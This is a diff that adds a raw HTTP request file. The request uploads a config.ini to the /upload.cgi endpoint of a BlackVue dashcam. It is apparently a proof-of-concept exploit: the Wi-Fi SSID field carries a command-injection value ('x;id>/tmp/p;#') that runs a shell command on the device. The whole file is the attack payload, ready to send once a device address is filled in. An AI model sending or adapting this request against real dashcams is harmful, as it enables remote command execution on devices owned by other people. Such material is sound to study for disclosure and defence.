@@ -1,0 +1,29 @@
+POST /upload.cgi HTTP/1.1
+Host: <dashcam-ip>
+Content-Type: multipart/form-data; boundary=----BlackVueBoundary
+Content-Length: 420
+Connection: close
+
+------BlackVueBoundary
+Content-Disposition: form-data; name="FileType"
+
+config
+------BlackVueBoundary
+Content-Disposition: form-data; name="FileData"; filename="config.ini"
+Content-Type: application/octet-stream
+
+[Tab1]
+TimeSet=0
+TimeZone=-1100
+GpsSync=1
+NormalRecord=1
+[Wifi]
+ap_ssid=BlackVue
+ap_pw=
+sta_ssid=x;id>/tmp/p;#
+sta_pw=
+WifiSleepMode=1
+[Cloud]
+CloudService=1
+
+------BlackVueBoundary--
